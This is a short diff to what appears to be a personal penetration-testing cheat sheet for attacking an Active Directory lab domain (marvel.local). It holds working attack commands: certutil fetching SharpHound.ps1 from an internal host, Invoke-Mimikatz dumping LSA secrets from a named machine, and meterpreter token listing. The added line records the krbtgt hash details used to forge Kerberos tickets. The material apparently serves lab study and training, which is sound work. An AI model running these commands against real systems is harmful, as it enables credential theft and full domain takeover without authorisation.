@@ -72,6 +72,7 @@ certutil -urlcache -f http://192.168.0.27/SharpHound.ps1 SharpHound.ps1
 . .\SharpHound.ps1
 
 Invoke-Mimikatz -Command '"priviliege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local
+kerberos hash -> RID + NTLM + User: krbtgt
 
 meterpreter > list_tokens -u
 
